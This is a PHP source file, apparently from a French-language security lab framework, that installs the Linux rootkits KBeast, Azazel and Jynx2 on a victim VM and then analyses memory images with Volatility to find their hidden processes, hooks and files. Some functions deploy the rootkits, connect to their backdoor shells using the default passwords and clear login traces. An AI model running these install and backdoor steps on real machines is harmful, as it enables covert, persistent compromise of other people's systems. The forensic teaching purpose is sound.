         * echo 'test h4ck3r d4t4' > /home/rohff/Desktop/_h4x_h4dedata.txt
         *
         */
        
        $rootkit4linux_kernel_kbeastv1 = new bin4linux($this->file_path, $this->attacker_port);
       // $rootkit4linux_kernel_kbeastv1->for4linux_all("");exit();$this->pause();
        
       // $this->ssTitre("Petit resume du resultat");$this->cmd("localhost","egrep -i \"(vol.py|kbeast|h4x|10.100.10.1|HOOKED|h4ck3r|$pid|$ppid|$deamon|ipsec)\" kbeastv1.rst"); $this->pause();
        
        
        $this->ssTitre("Find hidden connexion");
        $rootkit4linux_kernel_kbeastv1->for4linux_Networking_connexion_netstat("| grep -i 'listen' | grep '13377' ");
        $file_netstat = $rootkit4linux_kernel_kbeastv1->for4linux_Networking_connexion_netstat("| grep -i 'established' | sort -u ");
        $pids_connexion = $this->req_ret_tab("cat $file_netstat | grep -i 'established' | sort -u | cut -d'/' -f2 | sort -u");
        $this->pause();
        foreach ($pids_connexion as $connexion){
            $connexion = trim($connexion);
            $rootkit4linux_kernel_kbeastv1->for4linux_Process_file_open_lsof("| grep socket | grep -E -i \"$connexion\"");
        }
        $this->pause();
        
        $this->ssTitre("Find hidden process");
        $this->ssTitre("PID & PPID");
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_pstree("| grep -E -i \"$pid|$ppid|$deamon\" -B2 -A2 ");
        $this->pause();
        $rootkit4linux_kernel_kbeastv1->for4linux_Information_info_regs("| grep -E -i \"PID: $pid|PID: $ppid|PID: $deamon\"  -A19 ");
        $this->pause();
        $this->note("Kbeast backdoor is hidden from ps but is visible in /proc/<PID Kbeast>/cmdline ");
        $this->pause();
        $rootkit4linux_kernel_kbeastv1->for4linux_Information_file_enum("| grep -E -i \"/proc/$pid/cmdline\" ");
        $rootkit4linux_kernel_kbeastv1->for4linux_Information_file_enum("| grep -E -i \"/proc/$ppid/cmdline\" ");
        $rootkit4linux_kernel_kbeastv1->for4linux_Information_file_enum("| grep -E -i \"/proc/$deamon/cmdline\" ");
        $this->pause();
        
        
        
        $this->ssTitre("Find Hooking Functions");
        $rootkit4linux_kernel_kbeastv1->for4linux_Malware_check_syscall("");
        $this->pause();
        
        $this->ssTitre("Find hidden modules");
        $file_check_module = $rootkit4linux_kernel_kbeastv1->for4linux_Malware_check_modules("");
        $tmp = $this->req_ret_tab("grep -Po \"0x[0-9a-fA-F]{4,16}\" $file_check_module ");
        $inode_module = $tmp [0];
        unset($tmp);
        $this->pause();
        
        $this->ssTitre("Dump hidden modules");
        $file_dump_module = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_Module_Kernel($inode_module, "");
        $file_name = $this->req_ret_str("grep -Po -i \"[0-9a-z._]*.lkm\" $file_dump_module");
        $check = new bin4linux("$this->file_dir/$this->file_name/$file_name");
        $check->file_file2virus2vt();
        $this->pause();
        
        $this->ssTitre("Find hidden Files/Dir ");
        $rootkit4linux_kernel_kbeastv1->for4linux_Information_file_enum("| grep -E -i \"(kbeast|h4x|__test2)\" | grep  -Po \"[a-z0-9-_/.]*$\" | sort -u ");
        $this->pause();
        
        $this->ssTitre("Find Hidden activity");
        $rootkit4linux_kernel_kbeastv1->for4linux_Malware_erase_track("");
        
        $this->pause();
        
        $this->ssTitre("Find Erased activity");
        $rootkit4linux_kernel_kbeastv1->for4linux_Information_bash_history("| grep -E -i \"($pid|$ppid|$deamon)\"");
        $this->pause();
        
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_maps("| grep $pid | grep heap ");
        $rootkit4linux_kernel_kbeastv1->for4linux_Dump_process_map($pid,"");
        $this->requette("cat $this->file_dir/$this->file_name/task.$pid.*.vma | strings | grep -E -i  \"__test|kill|netstat|h4x3d\" ");
        $this->pause();
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_maps("| grep $ppid | grep heap ");
        $rootkit4linux_kernel_kbeastv1->for4linux_Dump_process_map($ppid,"");
        $this->requette("cat $this->file_dir/$this->file_name/task.$ppid.*.vma | strings | grep -E -i  \"__test|kill|netstat|h4x3d\"");
        $this->pause();
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_maps("| grep $deamon | grep heap ");
        $rootkit4linux_kernel_kbeastv1->for4linux_Dump_process_map($deamon,"");
        $this->requette("cat $this->file_dir/$this->file_name/task.$deamon.*.vma | strings | grep -E -i  \"__test|kill|netstat|h4x3d\" ");
        $this->pause();
        
        
        $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/acctlog.0", "");
        $malw = new file($file_exec);
        $malw->file_file2strings();$this->pause();
        
        $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/acctlog.1000", "");
        $malw = new file($file_exec);
        $malw->file_file2strings();$this->pause();
        
        $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/acctlog.2", "");
        $malw = new file($file_exec);
        $malw->file_file2strings();$this->pause();
        
        
        
        
        
        
        
        $this->ssTitre("Find root privilege");
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_pidhashtable("| grep -E -i \"($pid|$ppid|$deamon)\"");
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_psaux_prog_argv("| grep -E -i \"($pid|$ppid|$deamon)\"");
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_file_open_lsof("| grep -E -i \"($pid|$ppid|$deamon)\"");$this->pause();
        $this->pause();
        $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/proc/$pid/status", "");
        $malw = new file($file_exec);
        $malw->file_file2strings();$this->pause();
        
        $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/proc/$ppid/status", "");
        $malw = new file($file_exec);
        $malw->file_file2strings();$this->pause();
        
        $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/proc/$deamon/status", "");
        $malw = new file($file_exec);
        $malw->file_file2strings();$this->pause();
        $this->pause();
        
        
        $this->ssTitre("Find Malware PATH");
        $rootkit4linux_kernel_kbeastv1->for4linux_Process_find_elf_binary("| grep -E -i \"($pid|$ppid|$deamon)\"");
        $this->pause();
        
        $this->ssTitre("Dump Malware PATH");
        $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/_h4x_bd", "");
        $malw = new bin4linux($file_exec);
        $malw->file_file2virus2vt();$this->pause();
        $malw->file_file2strings();$this->pause();
        $malw->elf2fonctions_externes();$this->pause();
        $malw->elf2fonctions_internes();$this->pause();
        
        
        $this->requette("gdb --batch -q -ex 'run' -ex 'set disassembly-flavor intel' -ex 'disas enterpass' $malw->file_path | grep 'mov    DWORD PTR' ");
        $addrs = $this->req_ret_tab("gdb --batch -q -ex 'run' -ex 'set disassembly-flavor intel' -ex 'disas enterpass' $malw->file_path | grep 'mov    DWORD PTR' | grep -Po \"0x[0-9a-f]{7,16}\$\" ");
        $this->pause();
        $this->ssTitre("Find Malware password");
        foreach ($addrs as $addr )
            $this->requette("gdb --batch -q -ex 'run' -ex 'set disassembly-flavor intel' -ex 'x/s $addr' $malw->file_path ");
            $this->pause();
            
            $this->requette("gdb --batch -q -ex \"r \" -ex 'set disassembly-flavor intel' -ex \"disas bindshell\" $malw->file_path");
            $addrs = $this->req_ret_tab("gdb --batch -q -ex 'run' -ex 'set disassembly-flavor intel' -ex 'disas bindshell' $malw->file_path | grep 'mov    DWORD PTR' | grep -Po \"0x[0-9a-f]{7,16}\$\" ");
            $this->pause();
            foreach ($addrs as $addr ) {
                $this->requette("gdb --batch -q -ex 'run' -ex 'set disassembly-flavor intel' -ex 'x/s $addr' $malw->file_path ");
                $this->requette("gdb --batch -q -ex 'run' -ex 'set disassembly-flavor intel' -ex 'x/s *$addr' $malw->file_path ");
            }
            $this->pause();
            
            
            
            
            $this->todo("refaire avec strncmp personnalisée (ld_preload) ");
            
    }
    function rootkit4linux_kernel_kbeastv1_conclusion() {
        $this->ssTitre(__FUNCTION__);
        $this->todo("chkrootkit and rkhunter");
        $this->todo("Rkhunter
The first detection software we chose to analyze was Rkhunter (Rootkit Hunter).
Rkhunter is an open-source detection tool that 'checks computers running UNIX for the presence of rootkits and other unwanted tools'.
It does so by running a shell script which performs various checks on the system such as searching for the default files and directories used by common rootkits, searching for hidden files, doing SHA1 hash comparison, and searching for suspicious open ports.
Running Rkhunter on our environment with the KBeast LKM loaded, Rkhunter discovered KBeast’s loadable kernel module (/usr/_h4x_/ipsecs-kbeast-v1.ko), backdoor script (/usr/_h4x_/_h4x_bd), and hidden directory (/usr/_h4x_).
Rkhunter detected these by searching the system for specific default files and directories that were associated with the KBeast rootkit.
However, Rkhunter was not successful in discovering any hidden processes, hooked system calls, or hidden files other than those it specifically searched for. ");
        $this->note("We can see in the first output what some clean entries look like and that the system call table index is reported along with the symbol name and address.
	For hooked entries, we instead see HOOKED in place of a symbol name because the hooked function points to an unknown address (in this case inside the rootkit’s module).");
        $this->todo("VRF les Adresses si elles correspondent au chargement du module ipsecs-kbeast-v1.ko");
        $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -ggdb  -o $this->vm_tmp_lin//preloadcheck -w -m32 -ldl; $this->vm_tmp_lin/preloadcheck");
        $this->pause();
    }
    
    
    function rootkit4linux_user_Fontanini(){
        $this->ssTitre(__FUNCTION__);
        
    }
    function rootkit4linux_user_azazel() {
        $this->titre(__FUNCTION__);
        /*
         * "objdump -tT /lib/i386-linux-gnu/libc.so.6 | grep fopen", I got:
         * 00066670 g DF .text 00000030 GLIBC_2.1 fopen
         * 0012e2d0 g DF .text 00000088 (GLIBC_2.0) fopen
         *
         * cat azazel.all | egrep "(azazel|/lib/libselinux.so|changeme|61040|__test2.txt|18257|18334|18378|18379|18405|18553|18735|18838|18885|18886|HIST|/dev/pts/27|10.20.10.1)"
         * cat azazel.all | egrep "(azazel|/lib/libselinux.so|changeme|61040|__test2.txt|18257|18334|18885|18886|HIST|/dev/pts/27|10.20.10.1)" | more
         *
         * python /opt/volatility/trunk/vol.py --location=file:///home/rohff/EH/TOOLS/memory/rootkit_linux_azazel_ub1404_3.13.0-24-generic.vmem --profile=LinuxUbuntu1404x86 linux_apihooks --pid=18257,18334,18885,18886
         */
       /* 
        $this->rootkit4linux_user_azazel_intro();
        $this->rootkit4linux_user_azazel_download();
        $this->rootkit4linux_user_azazel_install();
        $this->rootkit4linux_user_azazel_execution();
        */
        $this->rootkit4linux_user_azazel_forensics();
        $this->rootkit4linux_user_azazel_conclusion();
    }
    function rootkit4linux_user_azazel_conclusion(){
        $this->ssTitre(__FUNCTION__);
    }
    
    
    function rootkit4linux_user_azazel_intro() {
        $this->ssTitre(__FUNCTION__);
    }
    function rootkit4linux_user_azazel_download() {
        $this->ssTitre(__FUNCTION__);
        $this->net("https://github.com/chokepoint/azazel");
    }
    function rootkit4linux_user_azazel_install() {
        $this->ssTitre(__FUNCTION__);
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_tools/Malware/rootkit4linux_user_azazel.tar.gz", "$this->vm_tmp_lin/rootkit4linux_user_azazel.tar.gz");
        
        
        $this->cmd($this->target_ip, "sudo ps aux | grep ssh");
        $this->cmd($this->target_ip, "tar -xvzf $this->vm_tmp_lin/rootkit4linux_user_azazel.tar.gz -C /tmp/ ");
        $this->cmd($this->target_ip, "gedit $this->vm_tmp_lin/rootkit4linux_user_azazel/config.py");
        
        $this->cmd($this->target_ip, "cd $this->vm_tmp_lin/rootkit4linux_user_azazel; make; sudo make install");
        $this->cmd($this->target_ip, "grep -v -e '^$' /etc/ld.so.preload");
        $this->cmd($this->target_ip, "sudo ps aux | grep ssh");
        $this->cmd($this->target_ip, "sudo kill -9 `pidof sshd`");
        $this->cmd($this->target_ip, "sudo ps aux | grep ssh");
        $this->pause();
    }
    function rootkit4linux_user_azazel_execution() {
        $this->ssTitre(__FUNCTION__);
        $pid = 13328;
        $port = 61040;
        $module_name = "libselinux.so";
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
        $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
        $this->pause();
        
        $this->ssTitre("Make connection to Victim ");
        // socat -,raw,echo=0 TCP:target:port,bind=:61040
        $this->cmd("localhost", "nc $this->target_ip 22 -p $port -v");
        $this->article("Backdoor password", "changeme");
        $this->note("you could choose port number between 61040-61050 for plaintext backdoor");
        $this->pause();
        $this->for4linux_Dyn4invest_port($this->target_ip, $port);
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/netstat");
        $this->pause();
        $this->todo("HIDE THIS SHELL");
        $this->ssTitre("Clean Log connection");
        $this->for4linux_Dyn4invest_user($this->target_ip, "");
        $this->cmd($this->target_ip, "CLEANUP_LOGS=\"pts/1\" ls");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/usr/bin/who");
        $this->pause();
        
        $this->ssTitre("Anti-debugging");
        $this->for4linux_Dyn4invest_pid($this->target_ip, $pid);
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/usr/bin/strace");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/usr/bin/ltrace");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/usr/bin/gdb");
        $this->pause();
        
        $this->ssTitre("hidden File / directory");
        $this->cmd($this->target_ip, "echo 'fichier normal' > test1.txt ; echo 'ce fichier est cachee' > __test2.txt;  echo 'test3' > test3.txt ");
        $this->cmd($this->target_ip, "ls *.txt ; cat __test2.txt");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/cat");
        $this->pause();
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/ls");
        $this->pause();
        
        $this->cmd($this->target_ip, "grep -v -e '^$' /etc/ld.so.preload");
        $this->pause();
        $this->ssTitre("Hooking API libc");
        $this->cmd($this->target_ip,"grep -i \"sys_\" $this->vm_tmp_lin/rootkit4linux_user_azazel/const.h ");
        $this->pause();
    }
    
    
    public function rootkit4linux_user_azazel_forensics() {
        $this->ssTitre(__FUNCTION__);
        
        $pid = 3058; //                           18257,18885,18886 | 18334,18378,18379,18405,18553,18735,18838,18885,18886 HISTFILE /dev/pts/27
        $pid_1 = 3058;
        $pid_2 = 3059 ;
        $ppid = 3059 ;
        $ppid_1 = 3039 ;
        $deamon = 3039;
        $port = 61040;
        $module_name = "libselinux.so";
        $filter = "";
        
        
        $for4linux_azazel = new bin4linux($this->file_path, $this->attacker_port);
        //$for4linux_azazel->for4linux_all("");$this->pause();
        //$this->ssTitre("Petit resume du resultat");$this->cmd("localhost","egrep -i \"(vol.py|azazel|libselinux.so|changeme|61040|__|10.100.10.1|HOOKED|h4ck3r|13328)\" azazel.rst");$this->pause();
        
        
        $this->ssTitre("Find hidden connexion");
        $for4linux_azazel->for4linux_Networking_connexion_netstat("| grep -i 'established' ");
        $this->pause();
        $file_netstat = $for4linux_azazel->for4linux_Networking_connexion_netstat("| grep -i 'established' | sort -u ");
        $malw_pid_1 = $this->req_ret_str("cat $file_netstat | grep -i 'established' | sort -u | cut -d'/' -f2 | sort -u");
        $this->pause();
        $for4linux_azazel->for4linux_Process_file_open_lsof(" | grep socket | grep -E -i \" $malw_pid_1 \"");
        
        $this->pause();
        
        
        $this->titre("Find hidden process");
        $this->ssTitre("PID & PPID");
        $for4linux_azazel->for4linux_Process_pstree("| grep -E -i \"$pid|$ppid|$deamon\" -B1 -A1 ");
        $this->pause();
        $for4linux_azazel->for4linux_Information_info_regs("| grep -E -i \"PID: $pid|PID: $ppid|PID: $deamon\"  -A19 ");
        $this->pause();
        $for4linux_azazel->for4linux_Information_file_enum("| grep -E -i \"/proc/$pid/cmdline\" ");
        $for4linux_azazel->for4linux_Information_file_enum("| grep -E -i \"/proc/$ppid/cmdline\" ");
        $for4linux_azazel->for4linux_Information_file_enum("| grep -E -i \"/proc/$deamon/cmdline\" ");
        $this->pause();
        
        
        $this->ssTitre("Find hidden Files/Dir ");
        $for4linux_azazel->for4linux_Information_file_enum("| grep -E -i \"(azazel|__test2)\" | grep  -Po \"[a-z0-9-_/.]*$\" | sort -u ");
        $this->pause();
        
        
        $this->ssTitre("Find Hidden activity");
        $for4linux_azazel->for4linux_Malware_erase_track("");
        $this->pause();
        
        $this->ssTitre("Find Erased activity");
        $for4linux_azazel->for4linux_Information_bash_history("| grep -E -i \"($pid|$ppid|$deamon)\"");
        $this->pause();
        
        $this->ssTitre("Find root privilege");
        $for4linux_azazel->for4linux_Process_pidhashtable("| grep -E -i \"($pid|$ppid|$deamon)\"");
        $for4linux_azazel->for4linux_Process_psaux_prog_argv("| grep -E -i \"($pid|$ppid|$deamon)\"");
        $for4linux_azazel->for4linux_Process_file_open_lsof("| grep -E -i \"($pid|$ppid|$deamon)\"");$this->pause();
        $this->pause();
        
        
        $this->ssTitre("Find Malware PATH");
        $for4linux_azazel->for4linux_Process_find_elf_binary("| grep -E -i \"($pid|$ppid|$deamon|$module_name)\"");
        $this->pause();
        
        
        $this->ssTitre("Chargement de la librairie malicieuse pour toutes les applications");
        $for4linux_azazel->for4linux_Information_find_file_name('/etc/ld.so.preload', ""); $this->pause();
        $lib_preload_file = $for4linux_azazel->for4linux_Dump_file('/etc/ld.so.preload');$this->pause();
        $lib_preload = new bin4linux($lib_preload_file);
        $lib_preload->file_file2strings();
        $this->pause();
        $tmp_file = $for4linux_azazel->for4linux_Dump_file('/lib/libselinux.so');$this->pause();
        $malw = new bin4linux($tmp_file);
        $malw->elf2info();$this->pause();
        $malw->file_file2virus2vt();$this->pause();
        $malw->file_file2strings();$this->pause();
        $malw->elf2fonctions_externes();$this->pause();
        $malw->elf2fonctions_internes();$this->pause();
        $this->pause();
        
        $for4linux_azazel->for4linux_Process_maps("| grep $pid | grep heap ");
        $for4linux_azazel->for4linux_Dump_process_map($pid,"");
        $this->requette("cat $this->file_dir/$this->file_name/task.$pid.*.vma | strings | grep -E -i  \"hide_this_shell|azazel|__test|kill|netstat|changeme\" ");
        $this->pause();
        $for4linux_azazel->for4linux_Process_maps("| grep $ppid | grep heap ");
        $for4linux_azazel->for4linux_Dump_process_map($ppid,"");
        $this->requette("cat $this->file_dir/$this->file_name/task.$ppid.*.vma | strings | grep -E -i  \"hide_this_shell|azazel|__test|kill|netstat|changeme\"");
        $this->pause();
        $for4linux_azazel->for4linux_Process_maps("| grep $deamon | grep heap ");
        $for4linux_azazel->for4linux_Dump_process_map($deamon,"");
        $this->requette("cat $this->file_dir/$this->file_name/task.$deamon.*.vma | strings | grep -E -i  \"hide_this_shell|azazel|__test|kill|netstat|changeme\" ");
        $this->pause();
        
        
    }
    
    
    function rootkit4linux_user_jynx2() {
        $this->titre(__FUNCTION__);
        
        $this->rootkit4linux_user_jynx2_intro();
        $this->rootkit4linux_user_jynx2_download();
        $this->rootkit4linux_user_jynx2_install();
        $this->rootkit4linux_user_jynx2_execution();
        
        //$this->rootkit4linux_user_jynx2_forensics();
        //$this->rootkit4linux_user_jynx2_conclusion();
    }
    
    function rootkit4linux_user_jynx2_conclusion() {
        $this->ssTitre(__FUNCTION__);
    }
    
    
    function rootkit4linux_user_jynx2_intro() {
        $this->ssTitre(__FUNCTION__);
        $this->article("jynx2", "The jynx2 rootkit operates by loading malicious library functions into system binaries dynamically at runtime instead of replacing the actual binary on the file system
with a modified version");
        
        $this->article("Inserting the shared library", "In Linux, when a program is executed, the system checks for any additional shared libraries that need to be loaded at run time.
	This is done by first consulting the files /etc/ld.so.conf and /etc/ld.so.preload.
	Any libraries found here will be loaded first and will take precedence over other libraries.
	In addition, the environment variable LD_PRELOAD may be used to point to a shared library that will be loaded and take precedence just like a library in /etc/ld.so.preload");
        $this->pause();
        
        $this->article("The jynx2 rootkit", "makes use of this feature by creating a shared library that will cause files, processes and ports to be hidden when desired. Jynx2 forces the use of this library by adding it to the
/etc/ld.so.preload file. The /etc/ld.so.preload file is then hidden by the rootkit.
Once the rootkit has been injected, utilities like ls, ps and netstat will load the jynx2 shared library causing it to insert functionality into the running process that will hide evidence of files,
processes and connections used by the malware. In addition, the rootkit provides a shared library called reality.so that can be loaded when the attacker would like to view all
files, processes and network connections including the hidden ones. In other words, it provides a way for the attacker to view the actual state of the compromised system.");
        $this->pause();
        
        $this->article("Jynx2 privilege escalation feature", "The jynx2 rootkit also has as SUID shell or privilege escalation feature that is implemented by defining an environment variable in the config.h include file for jynx2.
On the infected system at the command prompt, setting an environment variable that was previously defined in the config.h file to some value other than NULL and issuing the
sudo command signals the rootkit to create a root shell. In this test the environment variable name was 'HIDEME'.");
        $this->pause();
        
        $this->note("the jynx2 library module is inserted dynamically into the running process sudo.
The rootkit examines the value of the HIDEME variable and detects that it not NULL.
That is a signal to the rootkit that the attacker is requesting a shell.
The rootkit causes the sudo process to change its UID to 0 and then spawn a shell that inherits root permissions.
By default, this action does not log to syslog.");
        $this->pause();
    }
    function rootkit4linux_user_jynx2_download() {
        $this->ssTitre(__FUNCTION__);
        $this->net("https://github.com/chokepoint/Jynx2");
    }
    function rootkit4linux_user_jynx2_execution() {
        $this->ssTitre(__FUNCTION__);
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
        $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
        $this->pause();
        // vm_revert2snapshot($this->target_ip, "rootkit_jynx2_installed");
        $this->cmd($this->target_ip, "LD_PRELOAD=/XxJynx/jynx2.so nc -l -p 5555 -v");
        $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S ncat $this->target 5555 -p 42 --ssl -v");
        $this->article("Password Shell", "DEFAULT_PASS");
        $this->pause();
        $this->cmd($this->target_ip, "LD_PRELOAD=/XxJynx/jynx2.so netstat -tupan | grep 5555 ");
        $this->cmd($this->target_ip, "LD_PRELOAD=/XxJynx/jynx2.so netstat -tupan | grep ESTABLISHED ");
        $this->ssTitre("Display Reality");
        $this->cmd($this->target_ip, "LD_PRELOAD=/XxJynx/reality.so netstat -tupan | grep 5555 ");
        $this->cmd($this->target_ip, "LD_PRELOAD=/XxJynx/reality.so netstat -tupan | grep ESTABLISHED ");
        
        $this->pause();
        
        $this->ssTitre("Hiding Directory");
        $this->cmd($this->target_ip, "ls -al / | grep XxJynx");
        $this->cmd($this->target_ip, "LD_PRELOAD=/XxJynx/reality.so ls -al / | grep XxJynx");
        $this->pause();
        
        $this->ssTitre("Hiding Files");
        $this->cmd($this->target_ip, "ls -al /XxJynx/ ");
        $this->cmd($this->target_ip, "LD_PRELOAD=/XxJynx/reality.so ls -al /XxJynx/ ");
        $this->pause();
        
        $this->ssTitre("Hooking Functions");
        $this->cmd($this->target_ip,"grep LD_PRELOAD $this->vm_tmp_lin/rootkit4linux_user_jynx2/jynx2.c");
        $this->pause();
        $this->cmd($this->target_ip,"egrep -n \"(hooked|dlsym)\" $this->vm_tmp_lin/rootkit4linux_user_jynx2/jynx2.c");
        $this->pause();
        // vm_download($this->target_ip, "/XxJynx/jynx2.so", "$this->file_dir/");
        $victime->vm2download("/XxJynx/jynx2.so", "$this->dir_tmp/jynx2.so");
        
        
        // cmd($this->target_ip, "gcc ./preloadcheck.c -ggdb -o ./preloadcheck -w -m32 -ldl; ./preloadcheck");
        $this->requette("strings $this->dir_tmp/jynx2.so");
        $this->pause();
        $check = new bin4linux("$this->dir_tmp/jynx2.so");
        $check->file_file2virus2vt();
        $check->bin2fonctions();
        $check->elf2fonctions();
        $check->elf2struct();
        $check->elf2sections();
        $this->pause();
        
        // ssTitre("Privilege Escalator");
    }
    function rootkit4linux_user_jynx2_forensics() {
        $this->ssTitre(__FUNCTION__);
        $this->chapitre("Analyzing Jynx and LD_PRELOAD Based Rootkits -- USER MODE ROOTKIT");

        $pid = "21402"; // 21113,21125,21286,21354,
        $filter = "";
        
        $for4linux_jynx2 = new bin4linux($this->file_path, $this->attacker_port); // ub1404x86_jynx2.vmem "LinuxUbuntu1404x86"
        //$for4linux_jynx2->for4linux_all("");$this->pause();

        
        $this->ssTitre("Hiding Connexion ");
        $for4linux_jynx2->for4linux_Networking_connexion_netstat("| grep nc ");
        $for4linux_jynx2->for4linux_Networking_connexion_netstat("| grep '10.50.10'");
        $this->pause();
        $for4linux_jynx2->for4linux_Networking_connexion_netstat("");
        $this->pause();
        
        $for4linux_jynx2->for4linux_Malware_plthook("--pid=$pid");
        $this->pause();
        $for4linux_jynx2->for4linux_Process_maps("--pid=$pid");
        $this->pause();
        $for4linux_jynx2->for4linux_Information_find_file("-F /XxJynx/jynx2.so");
        $this->pause();
        $for4linux_jynx2->for4linux_Information_find_file("-O $this->file_dir/jynx2-recovered.so -i 0xc78e6788");
        $this->pause();
        $this->requette("readelf -s $this->file_dir/jynx2-recovered.so  | grep OBJECT | grep -v GLIBC");
        $this->pause();
        $for4linux_jynx2->for4linux_Process_pstree("| grep nc");
        $this->pause();
        $for4linux_jynx2->for4linux_Process_pstree("--pid=21402");
        $this->pause();
        $for4linux_jynx2->for4linux_Process_pslist("| grep nc");
        $this->pause();
        $for4linux_jynx2->for4linux_Process_psaux_prog_argv("--pid=21402");
        $this->pause();
        $for4linux_jynx2->for4linux_Process_pslist("| grep bash");
        $this->pause();
        $for4linux_jynx2->for4linux_Process_maps("--pid=21402");
        $this->pause();
        $for4linux_jynx2->for4linux_Dump_process_map("21402", "");
        $this->pause();
        $this->requette("strings $this->file_dir/task.21402.0x* | grep DEFAULT_PASS");
        $this->pause();
        $for4linux_jynx2->for4linux_Dump_process_map("21402", "-s 0xb76e9000 ");
        $this->pause();
        $for4linux_jynx2->for4linux_Dump_process_map("21402", "-s 0xb76ee000 ");
        $this->pause();
        $this->requette("strings $this->file_dir/task.21402.0xb76e9000.vma $this->file_dir/task.21402.0xb76ee000.vma | grep DEFAULT_PASS");
        $this->pause();
        $this->requette("strings $this->file_dir/task.21402.0xb76e9000.vma ");
        $this->pause();
        $this->requette("strings $this->file_dir/task.21402.0xb76e9000.vma | grep X509 ");
        $this->pause();
        $this->requette("readelf -s $this->file_dir/jynx2-recovered.so  | grep OBJECT | grep -v GLIBC | grep -i SSL");
        $this->pause();
        $this->note("The Linux command ldd will show shared libraries used by a process.");
        $for4linux_jynx2->for4linux_Process_find_elf_binary("--pid=21402");
        $this->pause();
        $for4linux_jynx2->for4linux_Information_library_list("--pid=21402");
        $this->pause();
        
        $for4linux_jynx2->for4linux_Process_psenv("--pid=21402 | grep -i ld_preload");
        $this->pause();
    }
    
    
    function rootkit4linux_user_jynx2_install() {
        $this->ssTitre(__FUNCTION__);
        
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
        $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
        $this->pause();
        $victime->vm2upload("$this->dir_tools/Malware/rootkit4linux_user_jynx2.tar.gz", "$this->vm_tmp_lin/rootkit4linux_user_jynx2.tar.gz");
        $this->cmd($this->target_ip, "tar -xvzf $this->vm_tmp_lin/rootkit4linux_user_jynx2.tar.gz");
        $this->requette("tar -xvzf $this->dir_tools/Malware/rootkit4linux_user_jynx2.tar.gz $this->vm_tmp_lin/");
        $this->cmd($this->target_ip, "cd $this->vm_tmp_lin/rootkit4linux_user_jynx2; make; sudo make install ");
        $this->cmd($this->target_ip, "/usr/bin/grep 'LIBC_PATH' $this->vm_tmp_lin/rootkit4linux_user_jynx2/config.h ");
        $this->cmd($this->target_ip, "/usr/bin/locate libc.so.6");
        $this->important("change LIBC_PATH /lib/libc.so.6 -> /lib/i386-linux-gnu/libc.so.6 -> x86 \n\t/lib/x86_64-linux-gnu/libc.so.6 -> x64");
        $this->cmd($this->target_ip, "gedit $this->vm_tmp_lin/rootkit4linux_user_jynx2/config.h");
        $this->pause();
        
    }
    
    
    
}
?>